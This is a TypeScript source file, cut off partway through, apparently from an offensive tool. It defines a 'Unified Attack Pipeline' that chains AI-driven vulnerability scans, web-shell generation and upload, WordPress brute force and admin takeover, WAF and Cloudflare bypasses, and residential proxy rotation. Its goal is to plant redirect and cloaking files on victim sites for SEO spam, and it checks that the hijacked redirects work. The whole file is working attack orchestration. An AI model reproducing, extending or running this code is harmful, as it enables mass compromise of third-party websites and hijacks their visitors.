/**
 * Unified Attack Pipeline — Chains together:
 *   1. AI Vulnerability Analysis (deep scan)
 *   2. Shell Generation (tailored per target)
 *   3. Multi-Method Upload (aggressive fallback chain)
 *   4. Verification (HTTP check + redirect test)
 *
 * This is the "brain" that makes Autonomous Friday + SEO Spam work together.
 */
import { preScreenTarget, type PreScreenResult } from "./ai-prescreening";
import { runAiTargetAnalysis, type AiTargetAnalysis, type AnalysisStep } from "./ai-target-analysis";
import { fullVulnScan, type VulnScanResult, type RankedAttackVector, type ServerInfo, type CmsDetection } from "./ai-vuln-analyzer";
import { generateShellsForTarget, pickBestShell, generateUnconditionalHtmlRedirect, generateUnconditionalHtaccessRedirect, generateMetaRedirectHtml, generateJsRedirect, type GeneratedShell, type ShellGenerationConfig } from "./ai-shell-generator";
import { oneClickDeploy, type DeployResult, type DeployOptions, type ProgressEvent as DeployProgressEvent } from "./one-click-deploy";
import { tryAllUploadMethods, type UploadAttemptResult } from "./alt-upload-methods";
import { multiVectorParallelUpload, smartRetryUpload, type EnhancedUploadResult, type ParallelUploadConfig } from "./enhanced-upload-engine";
// ─── NEW ENGINES ───
import { runWafBypass, type WafBypassResult, type WafBypassConfig } from "./waf-bypass-engine";
import { runAllAltUploadVectors, type AltUploadResult, type AltUploadConfig } from "./alt-upload-vectors";
import { runAllIndirectAttacks as runIndirectAttacks, type IndirectAttackResult, type IndirectAttackConfig } from "./indirect-attack-engine";
import { runAllDnsAttacks as runDnsAttacks, type DnsAttackResult, type DnsAttackConfig } from "./dns-domain-attacks";
import { runAllConfigExploits as runConfigExploits, type ConfigExploitResult, type ConfigExploitConfig } from "./config-exploitation";
import { generateCloakingPackage, type CloakingConfig, type CloakingShell as CloakingShellResult } from "./cloaking-shell-generator";
import { generateContentPack, type ContentConfig, type ContentPack } from "./cloaking-content-engine";
import { executeInjection, type InjectionConfig, type InjectionResult } from "./php-injector";
import { uploadContentToCdn, type CdnUploadResult } from "./content-cdn";
import { sendTelegramNotification, type TelegramNotification } from "./telegram-notifier";
import { runWpAdminTakeover, runShellExecFallback, type WpAdminConfig, type WpTakeoverResult } from "./wp-admin-takeover";
import { runWpDbInjection, type WpDbInjectionConfig, type WpDbInjectionResult } from "./wp-db-injection";
import { proxyPool, fetchWithPoolProxy } from "./proxy-pool";
import { generatePostUploadPayloads, deployPostUploadPayloads, runDetectionScan, type PostUploadReport, type DeployablePayload } from "./payload-arsenal";
import { runShelllessAttacks, type ShelllessResult, type ShelllessConfig } from "./shellless-attack-engine";
import { runAiCommander, type AiCommanderResult, type AiCommanderEvent } from "./ai-autonomous-engine";
import { runNonWpExploits, type NonWpScanResult, type ExploitResult } from "./non-wp-exploits";
import { runComprehensiveAttackVectors, type AttackVectorResult, type AttackVectorConfig } from "./comprehensive-attack-vectors";
import { findOriginIP, type OriginIPResult } from "./cf-origin-bypass";
import { wpBruteForce, wpAuthenticatedUpload, type BruteForceResult, type WPCredentials } from "./wp-brute-force";
import { createAttackLogger, type AttackLogger } from "./attack-logger";
import { buildTargetProfile, shouldSkipUploads, generateFallbackPlan, getOptimalRetryCount, formatFallbackPlan, type TargetProfile, type FallbackPlan } from "./smart-fallback";
import { runWpVulnScan, executeExploit, type WpScanResult, type WpVulnerability } from "./wp-vuln-scanner";
import { runCmsVulnScan, executeCmsExploit, detectCms, type CmsScanResult, type CmsVulnerability } from "./cms-vuln-scanner";
import { matchPluginsAgainstDb, lookupCves } from "./cve-auto-updater";
import { generateAndExecuteExploit, generateExploitPayload, generateWafEvasionVariants, type ExploitPayload, type WafEvasionVariant } from "./ai-exploit-generator";
import { detectWaf, getEvasionStrategy, applyEvasionToPayload, type WafDetectionResult, type EvasionStrategy } from "./waf-detector";
import { trackExploitAttempt, trackWafDetection, extractDomain } from "./exploit-tracker";
import { selectBypassTechniques, notifyWafBypassSuccess } from "./waf-bypass-strategies";

// ═══════════════════════════════════════════════════════
//  TYPES
// ═══════════════════════════════════════════════════════

export interface PipelineConfig {
  targetUrl: string;
  redirectUrl: string;
  seoKeywords: string[];
  cloaking?: boolean;
  geoRedirect?: boolean;
  parasiteContent?: "short" | "medium" | "long";
  maxUploadAttempts?: number;
  timeoutPerMethod?: number;
  // Cloaking options (fdv.uni-lj.si style)
  enableCloaking?: boolean;
  cloakingBrand?: string;
  cloakingContentType?: "landing" | "article" | "doorway" | "review";
  // Advanced attack options
  enableWafBypass?: boolean;
  enableAltUpload?: boolean;
  enableIndirectAttacks?: boolean;
  enableDnsAttacks?: boolean;
  enableConfigExploit?: boolean;
  enableWpAdminTakeover?: boolean;
  enableWpDbInjection?: boolean;
  proxyUrl?: string; // residential proxy support
  // Method priority & advanced config
  methodPriority?: Array<{ id: string; enabled: boolean }>;
  proxyList?: string[]; // multiple proxy URLs
  weightedRedirects?: Array<{ url: string; weight: number }>;
  // AI Commander — LLM-driven autonomous attack loop
  enableAiCommander?: boolean;
  aiCommanderMaxIterations?: number;
  // Post-upload payload deployment
  enablePostUpload?: boolean;
  // Comprehensive attack vectors (SSTI, LDAP, NoSQL, IDOR, BOLA, BFLA, JWT, etc.)
  enableComprehensiveAttacks?: boolean;
  // User tracking
  userId?: number;
  // Global pipeline timeout (ms) — default 20 minutes
  globalTimeout?: number;
}

export interface PipelineEvent {
  phase: "ai_analysis" | "prescreen" | "vuln_scan" | "shell_gen" | "upload" | "verify" | "complete" | "error" | "waf_bypass" | "alt_upload" | "indirect" | "dns_attack" | "config_exploit" | "recon" | "cloaking" | "wp_admin" | "wp_db_inject" | "world_update" | "shellless" | "email" | "cf_bypass" | "wp_brute_force" | "post_upload" | "comprehensive" | "smart_fallback";
  step: string;
  detail: string;
  progress: number; // 0-100
  data?: any;
}

export interface UploadedFile {
  url: string;
  shell: GeneratedShell;
  method: string;
  verified: boolean;
  redirectWorks: boolean;
  redirectDestinationMatch: boolean;
  finalDestination: string;
  httpStatus: number;
  redirectChain?: string[];
}

export interface PipelineResult {
  success: boolean;
  targetUrl: string;
  redirectUrl: string;
  prescreen: PreScreenResult | null;
  vulnScan: VulnScanResult | null;
  shellsGenerated: number;
  uploadAttempts: number;
  uploadedFiles: UploadedFile[];
  verifiedFiles: UploadedFile[];
  totalDuration: number;
  aiDecisions: string[];
  errors: string[];
  // Advanced attack results
  wafBypassResults?: WafBypassResult[];
  altUploadResults?: AltUploadResult[];
  indirectAttackResults?: IndirectAttackResult[];
  dnsAttackResults?: DnsAttackResult[];
  configExploitResults?: ConfigExploitResult[];
  originIp?: string;
  discoveredCredentials?: any[];
  // WP Admin Takeover & DB Injection results
  wpAdminResults?: WpTakeoverResult[];
  wpDbInjectionResults?: WpDbInjectionResult[];
  // Shellless attack results
  shelllessResults?: ShelllessResult[];
  // Cloaking results
  cloakingShell?: CloakingShellResult | null;
  contentPack?: ContentPack | null;
  // Injection & CDN results
  injectionResult?: InjectionResult | null;
  cdnUploadResult?: CdnUploadResult | null;
  telegramSent?: boolean;
  emailSent?: boolean;
  // AI Target Analysis (Phase 0)
  aiTargetAnalysis?: AiTargetAnalysis | null;
  // Non-WP exploit results
  nonWpExploitResults?: NonWpScanResult | null;
  // AI Commander result
  aiCommanderResult?: {
    success: boolean;
    iterations: number;
    successfulMethod: string | null;
    uploadedUrl: string | null;
    redirectVerified: boolean;
    totalDurationMs: number;
    decisionsCount: number;
  } | null;
  // CF Origin IP Bypass
  cfBypassResult?: OriginIPResult | null;
  // WP Brute Force
  wpBruteForceResult?: BruteForceResult | null;
  wpAuthCredentials?: WPCredentials | null;
  // Post-upload payload deployment
  postUploadReport?: PostUploadReport | null;
  // Detection scan
  detectionScan?: { detections: any[]; liveChecks: any[] } | null;
  // Comprehensive attack vectors (29 additional vectors)
  comprehensiveResults?: AttackVectorResult[] | null;
  // WP Vulnerability Scan (WPScan-style)
  wpVulnScan?: WpScanResult | null;
  // Multi-CMS Vulnerability Scan (Joomla, Drupal, Magento, etc.)
  cmsScan?: CmsScanResult | null;
  // DB-backed CVE matches (from auto-updated CVE database)
  dbCveMatches?: Array<{ pluginSlug: string; cveId: string | null; title: string; vulnType: string | null; severity: string | null; }> | null;
  // AI-generated exploit payloads used during the attack
  aiExploits?: Array<{ cveId: string | null; cms: string; component: string; vulnType: string; exploitType: string; success: boolean; uploadedUrl: string | null; }> | null;
  // WAF Detection & Evasion
  wafDetection?: WafDetectionResult | null;
  evasionStrategy?: EvasionStrategy | null;
}

type EventCallback = (event: PipelineEvent) => void;

// ═══════════════════════════════════════════════════════
//  VERIFICATION
// ═══════════════════════════════════════════════════════

interface VerificationResult {
  verified: boolean;
  redirectWorks: boolean;
  redirectDestinationMatch: boolean;
  finalDestination: string;
  httpStatus: number;
  phpNotExecuting?: boolean;
  redirectChain?: string[];
}

/**
 * Follow a redirect chain (HTTP 3xx) up to maxHops.
 * Returns the chain of URLs and the final destination.
 */
async function followRedirectChain(startUrl: string, maxHops = 10): Promise<{ chain: string[]; finalUrl: string; finalStatus: number }> {
  const chain: string[] = [startUrl];
  let currentUrl = startUrl;
  let finalStatus = 0;

  for (let i = 0; i < maxHops; i++) {
    try {
      // Direct fetch first for speed, proxy fallback
      let resp: Response;
      try {
        resp = await fetch(currentUrl, {
          method: "GET",
          redirect: "manual",
          headers: {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Referer": "https://www.google.com/search?q=test",
          },
          signal: AbortSignal.timeout(8000),
        });
      } catch {
        const targetDomain = currentUrl.replace(/^https?:\/\//, "").replace(/[\/:].*$/, "");
        const proxyResult = await fetchWithPoolProxy(currentUrl, {
          method: "GET",
          redirect: "manual",
          headers: {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Referer": "https://www.google.com/search?q=test",
          },
          signal: AbortSignal.timeout(8000),
        }, { targetDomain, timeout: 8000 });
        resp = proxyResult.response;
      }
      finalStatus = resp.status;

      if (resp.status >= 300 && resp.status < 400) {
        const loc = resp.headers.get("location");
        if (!loc) break;
        // Resolve relative URLs
        const nextUrl = loc.startsWith("http") ? loc : new URL(loc, currentUrl).href;
        chain.push(nextUrl);
        currentUrl = nextUrl;
        continue;
      }
      break; // Not a redirect, stop
    } catch {
      break;
    }
  }
  return { chain, finalUrl: currentUrl, finalStatus };
}

/**
 * Check if two URLs point to the same destination.
 * Compares hostname + pathname, ignoring trailing slashes, query params, and protocol.
 */
function urlsMatchDestination(actual: string, expected: string): boolean {
  try {
    const a = new URL(actual);
    const e = new URL(expected);
    // Normalize hostnames: strip www., lowercase
    const normHost = (h: string) => h.toLowerCase().replace(/^www\./, "");
    const aHost = normHost(a.hostname);
    const eHost = normHost(e.hostname);
    // Exact hostname match (with www normalization)
    if (aHost === eHost) return true;
    // Subdomain match: actual could be sub.example.com matching example.com
    if (aHost.endsWith("." + eHost) || eHost.endsWith("." + aHost)) return true;
    return false;
  } catch {
    // Fallback: flexible string containment
    const normA = actual.toLowerCase().replace(/^https?:\/\//, "").replace(/^www\./, "").replace(/\/+$/, "");
    const normE = expected.toLowerCase().replace(/^https?:\/\//, "").replace(/^www\./, "").replace(/\/+$/, "");
    return normA.includes(normE) || normE.includes(normA);
  }
}

async function verifyUploadedFile(
  fileUrl: string,
  redirectUrl: string,
  onEvent: EventCallback,
): Promise<VerificationResult> {
  try {
    // ─── Step 1: Check if file is accessible (not 403/404) ───
    const vfDomain = fileUrl.replace(/^https?:\/\//, "").replace(/[\/:].*$/, "");
    const { response: resp } = await fetchWithPoolProxy(fileUrl, {
      method: "GET",
      redirect: "manual",
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      },
      signal: AbortSignal.timeout(10000),
    }, { targetDomain: vfDomain, timeout: 10000 });

    const httpStatus = resp.status;

    if (httpStatus === 403 || httpStatus === 404 || httpStatus === 500) {
      onEvent({
        phase: "verify",
        step: "file_check",
        detail: `❌ ไฟล์ไม่สามารถเข้าถึงได้ (HTTP ${httpStatus}): ${fileUrl}`,
        progress: 0,
      });
      return { verified: false, redirectWorks: false, redirectDestinationMatch: false, finalDestination: "", httpStatus, redirectChain: [] };
    }

    // ─── Step 2: Check PHP execution ───
    let phpNotExecuting = false;
    if (fileUrl.endsWith(".php") && httpStatus === 200) {
      try {
        const { response: phpCheckResp } = await fetchWithPoolProxy(fileUrl, {
          method: "GET",
          headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" },
          signal: AbortSignal.timeout(10000),
        }, { targetDomain: vfDomain, timeout: 10000 });
        const phpBody = await phpCheckResp.text();
        if (phpBody.includes("<?php") || phpBody.includes("@ini_set") || phpBody.includes("$_SERVER") || phpBody.includes('header("')) {
          phpNotExecuting = true;
          onEvent({
            phase: "verify",
            step: "php_check",
            detail: `⚠️ PHP ไม่ถูก execute (server serve เป็น plain text) — ต้องใช้ .html แทน: ${fileUrl}`,
            progress: 40,
          });
        }
      } catch { /* ignore */ }
    }

    // ─── Step 3: Follow redirect chain with Google referer + ?r=1 ───
    const triggerUrl = fileUrl + "?r=1";
    const { chain, finalUrl, finalStatus } = await followRedirectChain(triggerUrl);
    const redirectChain = chain;

    // Check if we got a server-side redirect (3xx chain)
    let redirectWorks = false;
    let redirectDestinationMatch = false;
    let finalDestination = finalUrl;

    if (chain.length > 1) {
      // We followed at least one redirect hop
      redirectWorks = true;
      redirectDestinationMatch = urlsMatchDestination(finalUrl, redirectUrl);

      if (redirectDestinationMatch) {
        onEvent({
          phase: "verify",
          step: "redirect_destination",
          detail: `✅ Redirect ทำงานจริง! ${fileUrl} → ${finalUrl} (ตรงกับปลายทาง ${redirectUrl})`,
          progress: 100,
        });
      } else {
        onEvent({
          phase: "verify",
          step: "redirect_destination",
          detail: `⚠️ Redirect ทำงานแต่ไปผิดที่! ${fileUrl} → ${finalUrl} (ควรไป ${redirectUrl})`,
          progress: 70,
        });
      }
    }

    // ─── Step 4: Check body for JS/meta redirect if no server-side redirect ───
    if (!redirectWorks && (httpStatus === 200 || httpStatus === 301 || httpStatus === 302)) {
      try {
        const { response: bodyResp } = await fetchWithPoolProxy(triggerUrl, {
          method: "GET",
          headers: {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Referer": "https://www.google.com/search?q=test",
          },
          signal: AbortSignal.timeout(10000),
        }, { targetDomain: vfDomain, timeout: 10000 });
        const body = await bodyResp.text();
        const hasJsRedirect = body.includes("window.location") || body.includes("location.replace") || body.includes("location.href");
        const hasMetaRedirect = body.includes('http-equiv="refresh"') || body.includes("http-equiv='refresh'");

        if (hasJsRedirect || hasMetaRedirect) {
          redirectWorks = true;

          // Extract the actual redirect target from the body
          let extractedTarget = "";
          // Try meta refresh: content="0;url=https://..."
          const metaMatch = body.match(/content\s*=\s*["'][^"']*url\s*=\s*([^"'\s>]+)/i);
          if (metaMatch) extractedTarget = metaMatch[1];
          // Try JS: window.location = "https://..."
          if (!extractedTarget) {
            const jsMatch = body.match(/(?:window\.location|location\.(?:href|replace))\s*[=(]\s*["']([^"']+)["']/i);
            if (jsMatch) extractedTarget = jsMatch[1];
          }

          if (extractedTarget) {
            finalDestination = extractedTarget;
            redirectDestinationMatch = urlsMatchDestination(extractedTarget, redirectUrl);
          } else {
            // Can't extract target, fallback to hostname check
            const hasRedirectUrl = body.includes(redirectUrl) || body.includes(new URL(redirectUrl).hostname);
            redirectDestinationMatch = hasRedirectUrl;
            finalDestination = hasRedirectUrl ? redirectUrl : "unknown";
          }

          if (redirectDestinationMatch) {
            onEvent({
              phase: "verify",
              step: "redirect_destination",
              detail: `✅ Redirect ทำงานจริง! (via ${hasJsRedirect ? "JS" : "meta refresh"}) ${fileUrl} → ${finalDestination}`,
              progress: 100,
            });
          } else {
            onEvent({
              phase: "verify",
              step: "redirect_destination",
              detail: `⚠️ Redirect ทำงานแต่ไปผิดที่! (via ${hasJsRedirect ? "JS" : "meta refresh"}) ${fileUrl} → ${finalDestination} (ควรไป ${redirectUrl})`,
              progress: 70,
            });
          }
        }
      } catch { /* ignore */ }
    }

    // ─── Step 5: Final verdict ───
    if (!redirectWorks) {
      onEvent({
        phase: "verify",
        step: "redirect_check",
        detail: `⚠️ ไฟล์เข้าถึงได้ (HTTP ${httpStatus}) แต่ redirect ยังไม่ทำงาน: ${fileUrl}`,
        progress: 50,
      });
    }

    return {
      verified: httpStatus >= 200 && httpStatus < 400,
      redirectWorks,
      redirectDestinationMatch,
      finalDestination,
      httpStatus,
      phpNotExecuting,
      redirectChain,
    };
  } catch (error: any) {
    onEvent({
      phase: "verify",
      step: "error",
      detail: `❌ Verification error: ${error.message}`,
      progress: 0,
    });
    return { verified: false, redirectWorks: false, redirectDestinationMatch: false, finalDestination: "", httpStatus: 0, phpNotExecuting: false, redirectChain: [] };
  }
}

// ═══════════════════════════════════════════════════════
//  UPLOAD ORCHESTRATOR
// ═══════════════════════════════════════════════════════

// ─── Method priority mapping ───
const METHOD_REGISTRY: Record<string, string> = {
  // Core upload methods
  oneclick: "oneClickDeploy",
  try_all: "tryAllUploadMethods",
  parallel: "multiVectorParallel",
  smart_retry: "smartRetryUpload",
  // WordPress-specific
  wp_admin: "wpAdminTakeover",
  wp_db: "wpDbInjection",
  wp_brute_force: "wpBruteForce",
  cve_exploit: "cveExploit",
  cms_plugin_exploit: "cmsPluginExploit",
  // Alternative upload vectors
  alt_upload: "altUploadVectors",
  file_upload_spray: "fileUploadSpray",
  xmlrpc_attack: "xmlrpcAttack",
  rest_api_exploit: "restApiExploit",
  ftp_brute: "ftpBrute",
  webdav_upload: "webdavUpload",
  htaccess_overwrite: "htaccessOverwrite",
  // Advanced evasion
  waf_bypass: "wafBypass",
  config_exploit: "configExploitation",
  // Non-upload attacks
  indirect: "indirectAttacks",
  dns: "dnsAttacks",
  shellless_redirect: "shelllessRedirect",
  // Comprehensive attack vectors (AI-evolved)
  ssti_injection: "sstiInjection",
  nosql_injection: "nosqlInjection",
  lfi_rce: "lfiRce",
  ssrf: "ssrf",
  deserialization: "deserialization",
  open_redirect_chain: "openRedirectChain",
  cache_poisoning: "cachePoisoning",
  host_header_injection: "hostHeaderInjection",
  jwt_abuse: "jwtAbuse",
  race_condition: "raceCondition",
  mass_assignment: "massAssignment",
  prototype_pollution: "prototypePollution",
  // Redirect takeover (overwrite competitor redirects)
  redirect_takeover: "redirectTakeover",
  // AI-generated
  ai_generated_exploit: "aiGeneratedExploit",
  comprehensive: "comprehensiveVectors",
};

function getEnabledMethods(config: PipelineConfig): string[] {
  if (!config.methodPriority || config.methodPriority.length === 0) {
    // Default order
    return ["oneclick", "try_all", "parallel", "smart_retry"];
  }
  return config.methodPriority
    .filter(m => m.enabled)
    .map(m => m.id);
}

// ─── Weighted redirect selection ───
function selectRedirectUrl(config: PipelineConfig): string {
  if (!config.weightedRedirects || config.weightedRedirects.length === 0) {
    return config.redirectUrl;
  }
  const totalWeight = config.weightedRedirects.reduce((sum, r) => sum + r.weight, 0);
  let random = Math.random() * totalWeight;
  for (const wr of config.weightedRedirects) {
    random -= wr.weight;
    if (random <= 0) return wr.url;
  }
  return config.weightedRedirects[0].url;
}

// ─── Proxy rotation (with residential proxy pool fallback) ───
function selectProxy(config: PipelineConfig): string | undefined {
  // 1. User-provided proxy list takes priority
  if (config.proxyList && config.proxyList.length > 0) {
    return config.proxyList[Math.floor(Math.random() * config.proxyList.length)];
  }
  // 2. User-provided single proxy
  if (config.proxyUrl) {
    return config.proxyUrl;
  }
  // 3. Auto-select from residential proxy pool
  const poolProxy = proxyPool.getProxy("weighted");
  return poolProxy?.url;
}

async function uploadShellWithAllMethods(
  targetUrl: string,
  shell: GeneratedShell,
  prescreen: PreScreenResult | null,
  vulnScan: VulnScanResult | null,
  config: PipelineConfig,
  onEvent: EventCallback,
  deadline?: number,
): Promise<{ success: boolean; url: string; method: string }> {
  const fileContent = typeof shell.content === "string" ? shell.content : shell.content.toString("base64");
  const baseTimeout = config.timeoutPerMethod || 30000;
  const enabledMethods = getEnabledMethods(config);
  const effectiveRedirectUrl = selectRedirectUrl(config);
  const proxyUrl = selectProxy(config);
  // Dynamic timeout: use remaining time until deadline, capped at base timeout
  const getRemainingMs = () => deadline ? Math.max(deadline - Date.now(), 5000) : Infinity;
  const getMethodTimeout = () => Math.min(baseTimeout, getRemainingMs() / 3); // leave room for other methods
  const timeout = getMethodTimeout(); // initial timeout for method 1
  // Helper: check if we've exceeded the pipeline deadline
  const isExpired = () => deadline ? Date.now() > deadline : false;

  onEvent({
    phase: "upload",
    step: "method_plan",
    detail: `📋 Upload plan: ${enabledMethods.length} methods enabled — ${enabledMethods.map(m => METHOD_REGISTRY[m] || m).join(" → ")}${proxyUrl ? " (via proxy)" : ""}`,
    progress: 10,
  });

  // Method 1: oneClickDeploy (full pipeline)
  if (!enabledMethods.includes("oneclick") && enabledMethods.length > 0) {
    // Skip if not in priority list
  } else {
  onEvent({
    phase: "upload",
    step: "oneclick",
    detail: `📤 Method 1: oneClickDeploy — ${shell.filename}`,
    progress: 10,
  });

  try {
    const deployOpts: DeployOptions = {
      maxRetries: 3,
      uploadTimeout: timeout,
      verifyTimeout: 10000,
      seoKeywords: config.seoKeywords,
      enableParasitePages: true,
      parasiteContentLength: config.parasiteContent || "medium",
      preScreenResult: prescreen || undefined,
      onProgress: (event: DeployProgressEvent) => {
        onEvent({
          phase: "upload",
          step: "oneclick",
          detail: `oneClickDeploy: ${event.detail || event.phaseName || ""}`,
          progress: 10 + (event.progress || 0) * 0.2,
        });
      },
    };

    const result: DeployResult = await Promise.race([
      oneClickDeploy(targetUrl, config.redirectUrl, deployOpts),
      new Promise<DeployResult>((_, reject) => setTimeout(() => reject(new Error("oneClickDeploy timeout")), Math.min(timeout + 15000, getRemainingMs()))),
    ]);

    const shellUrl = result.shellInfo?.url || result.deployedFiles?.find(f => f.status === "deployed" && f.url)?.url;
    // Check success via: explicit success flag, OR redirect active, OR files deployed
    const isSuccess = result.success || result.summary?.redirectActive || (result.summary?.totalFilesDeployed ?? 0) > 0;
    if (isSuccess && shellUrl) {
      onEvent({
        phase: "upload",
        step: "oneclick_success",
        detail: `✅ oneClickDeploy สำเร็จ: ${shellUrl}`,
        progress: 30,
      });
      return { success: true, url: shellUrl, method: "oneClickDeploy" };
    }
  } catch (error: any) {
    onEvent({
      phase: "upload",
      step: "oneclick_fail",
      detail: `⚠️ oneClickDeploy ล้มเหลว: ${error.message} — ลอง method ถัดไป`,
      progress: 25,
    });
  }
  } // end oneclick block

  // Method 2: tryAllUploadMethods (FTP, CMS exploits, WebDAV, API endpoints)
  if (isExpired()) return { success: false, url: "", method: "deadline_expired" };
  if (prescreen && (enabledMethods.includes("try_all") || enabledMethods.length === 0)) {
    onEvent({
      phase: "upload",
      step: "all_methods",
      detail: `📤 Method 2: tryAllUploadMethods — ${shell.filename}`,
      progress: 30,
    });

    try {
      const results: UploadAttemptResult[] = await Promise.race([
        tryAllUploadMethods(
          targetUrl,
          prescreen,
          fileContent,
          shell.filename,
          "/",
          (method, status) => {
            onEvent({
              phase: "upload",
              step: "all_methods",
              detail: `tryAll: [${method}] ${status}`,
              progress: 35,
            });
          },
        ),
        new Promise<UploadAttemptResult[]>((_, reject) => setTimeout(() => reject(new Error("tryAllUploadMethods timeout")), Math.min(timeout + 30000, getRemainingMs()))),
      ]);

      const successResult = results.find(r => r.success && r.fileUrl);
      if (successResult && successResult.fileUrl) {
        onEvent({
          phase: "upload",
          step: "all_methods_success",
          detail: `✅ ${successResult.method} สำเร็จ: ${successResult.fileUrl}`,
          progress: 50,
        });
        return { success: true, url: successResult.fileUrl, method: successResult.method };
      }
    } catch (error: any) {
      onEvent({
        phase: "upload",
        step: "all_methods_fail",
        detail: `⚠️ tryAllUploadMethods ล้มเหลว: ${error.message}`,
        progress: 45,
      });
    }
  }

  // Method 3: multiVectorParallelUpload (brute force parallel)
  if (isExpired()) return { success: false, url: "", method: "deadline_expired" };
  if (!enabledMethods.includes("parallel") && enabledMethods.length > 0) {
    // Skip
  } else {
  onEvent({
    phase: "upload",
    step: "parallel",
    detail: `📤 Method 3: multiVectorParallelUpload — ${shell.filename}`,
    progress: 50,
  });

  try {
    // Comprehensive fallback paths when vuln scan finds no writable paths
    const scanPaths = vulnScan?.writablePaths?.length ? vulnScan.writablePaths.map(w => w.path) : null;
    const prescreenPaths = prescreen?.writablePaths?.length ? prescreen.writablePaths : null;
    const uploadPaths = scanPaths || prescreenPaths || [
      "/wp-content/uploads/", "/uploads/", "/images/", "/tmp/",
      "/wp-content/themes/", "/wp-content/plugins/", "/wp-includes/",
      "/media/", "/assets/", "/cache/", "/files/",
      "/public/uploads/", "/content/images/", "/data/", "/backup/",
    ];
    const parallelConfig: ParallelUploadConfig = {
      targetUrl,
      fileContent,
      fileName: shell.filename,
      uploadPaths,
      prescreen,
      timeout,
      onMethodProgress: (method, status) => {
        onEvent({
          phase: "upload",
          step: "parallel",
          detail: `parallel: [${method}] ${status}`,
          progress: 55,
        });
      },
    };

    const result = await Promise.race([
      multiVectorParallelUpload(parallelConfig),
      new Promise<any>((_, reject) => setTimeout(() => reject(new Error("parallel upload timeout")), Math.min(timeout + 30000, getRemainingMs()))),
    ]);

    if (result.success && result.bestResult?.fileUrl) {
      onEvent({
        phase: "upload",
        step: "parallel_success",
        detail: `✅ Parallel upload สำเร็จ: ${result.bestResult.fileUrl}`,
        progress: 70,
      });
      return { success: true, url: result.bestResult.fileUrl, method: `parallel_${result.bestResult.method}` };
    }
  } catch (error: any) {
    onEvent({
      phase: "upload",
      step: "parallel_fail",
      detail: `⚠️ Parallel upload ล้มเหลว: ${error.message}`,
      progress: 65,
    });
  }
  } // end parallel block

  // Method 4: smartRetryUpload (adaptive retry with increasing timeouts)
  if (isExpired()) return { success: false, url: "", method: "deadline_expired" };
  if (!enabledMethods.includes("smart_retry") && enabledMethods.length > 0) {
    // Skip
  } else {
  onEvent({
    phase: "upload",
    step: "smart_retry",
    detail: `📤 Method 4: smartRetryUpload — ${shell.filename}`,
    progress: 70,
  });

  try {
    // Comprehensive fallback paths for smart retry
    const scanPaths2 = vulnScan?.writablePaths?.length ? vulnScan.writablePaths.map(w => w.path) : null;
    const prescreenPaths2 = prescreen?.writablePaths?.length ? prescreen.writablePaths : null;
    const uploadPaths = scanPaths2 || prescreenPaths2 || [
      "/wp-content/uploads/", "/uploads/", "/images/",
      "/wp-content/themes/", "/tmp/", "/media/",
      "/assets/", "/cache/", "/files/",
    ];
    const retryConfig: ParallelUploadConfig = {
      targetUrl,
      fileContent,
      fileName: shell.filename,
      uploadPaths,
      prescreen,
      timeout: timeout + 10000,
      onMethodProgress: (method, status) => {
        onEvent({
          phase: "upload",
          step: "smart_retry",
          detail: `smartRetry: [${method}] ${status}`,
          progress: 75,
        });
      },
    };

    const result = await Promise.race([
      smartRetryUpload(retryConfig, 3),
      new Promise<any>((_, reject) => setTimeout(() => reject(new Error("smart retry timeout")), Math.min((timeout + 10000) * 3 + 30000, getRemainingMs()))),
    ]);

    if (result.success && result.bestResult?.fileUrl) {
      onEvent({
        phase: "upload",
        step: "smart_retry_success",
        detail: `✅ Smart retry สำเร็จ: ${result.bestResult.fileUrl}`,
        progress: 85,
      });
      return { success: true, url: result.bestResult.fileUrl, method: `smart_retry_${result.bestResult.method}` };
    }
  } catch (error: any) {
    onEvent({
      phase: "upload",
      step: "smart_retry_fail",
      detail: `⚠️ Smart retry ล้มเหลว: ${error.message}`,
      progress: 80,
    });
  }
  } // end smart_retry block

  return { success: false, url: "", method: "all_failed" };
}

// ═══════════════════════════════════════════════════════
//  MAIN PIPELINE
// ═══════════════════════════════════════════════════════

export async function runUnifiedAttackPipeline(
  config: PipelineConfig,
  onEvent: EventCallback = () => {},
): Promise<PipelineResult> {
  const startTime = Date.now();
  const GLOBAL_TIMEOUT = config.globalTimeout || 15 * 60 * 1000; // 15 minutes — more time for complex attacks
  const deadline = startTime + GLOBAL_TIMEOUT;
  const pipelineAbort = new AbortController();
  const aiDecisions: string[] = [];
  const errors: string[] = [];
  const uploadedFiles: UploadedFile[] = [];
  let prescreen: PreScreenResult | null = null;
  let vulnScan: VulnScanResult | null = null;

  // ─── Attack Logger & Smart Fallback ───
  const targetDomain = config.targetUrl.replace(/^https?:\/\//, "").replace(/\/.*$/, "");
  const attackLogger = createAttackLogger(null, config.userId || 0, targetDomain);
  const failedMethods: string[] = [];
  let targetProfile: TargetProfile | null = null;
  let fallbackPlan: FallbackPlan | null = null;

  // Wrap onEvent to also log
  const originalOnEvent = onEvent;
  const loggedOnEvent: EventCallback = (event) => {
    originalOnEvent(event);
    attackLogger.log(event).catch(() => {});
  };

  /** Check if pipeline should stop (timeout or success already achieved) */
  function shouldStop(reason?: string): boolean {
    if (pipelineAbort.signal.aborted) return true;
    if (Date.now() > deadline) {
      loggedOnEvent({ phase: "error", step: "global_timeout", detail: `⏰ Global pipeline timeout (${GLOBAL_TIMEOUT / 60000}min) reached${reason ? ` during ${reason}` : ''} — wrapping up...`, progress: 99 });
      errors.push(`global_timeout_during_${reason || 'unknown'}`);
      return true;
    }
    return false;
  }

  /** Check if we already have a verified redirect (no need to continue attacking) */
  function hasSuccessfulRedirect(): boolean {
    return uploadedFiles.some(f => f.redirectWorks && f.redirectDestinationMatch);
  }

  // ─── Phase 0: AI Target Analysis (NEW — deep intelligence before attack) ───
  let aiTargetAnalysis: AiTargetAnalysis | null = null;
  try {
    loggedOnEvent({
      phase: "ai_analysis",
      step: "start",
      detail: `🧠 Phase 0: AI Target Analysis — วิเคราะห์เว็บเป้าหมาย ${config.targetUrl} อย่างละเอียด...`,
      progress: 0,
    });

    aiTargetAnalysis = await Promise.race([
      runAiTargetAnalysis(
